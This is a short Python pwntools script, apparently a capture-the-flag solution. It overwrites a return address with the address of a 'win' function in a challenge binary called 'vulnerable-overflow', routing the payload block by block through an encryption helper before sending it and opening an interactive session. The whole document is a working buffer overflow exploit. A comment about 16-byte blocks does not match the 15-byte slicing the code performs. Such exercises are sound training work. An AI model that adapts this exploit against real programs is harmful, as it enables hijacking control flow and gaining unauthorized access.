from pwn import *
import subprocess
import struct

context.binary = ELF("/challenge/vulnerable-overflow")
#win_addr = context.binary.symbols["win"]

win_addr = 0x4013b6
offset = 75

payload = b"A" * offset

# Split payload into 16-byte blocks (AES block size)
blocks = [payload[i:i+15] for i in range(0, len(payload), 15)]

blocks.append(b"A"*8 + p64(win_addr))

ciphertext = b""
for i, block in enumerate(blocks):
    in_file = f"block_{i}.in"
    out_file = f"block_{i}.out"

    with open(in_file, "wb") as f:
        f.write(block)

    subprocess.run(f"/challenge/dispatch < {in_file} > {out_file}", shell=True)

    with open(out_file, "rb") as f:
        block_data = f.read()
        if i == 0:
            ciphertext += block_data
        else:
            ciphertext += block_data[16:]

with open("cipher", "wb") as f:
    f.write(ciphertext)

# Send the crafted ciphertext to the vulnerable binary

p = process("/challenge/vulnerable-overflow")
print(f"PID is {p.pid}")
p.send(ciphertext)
p.interactive()
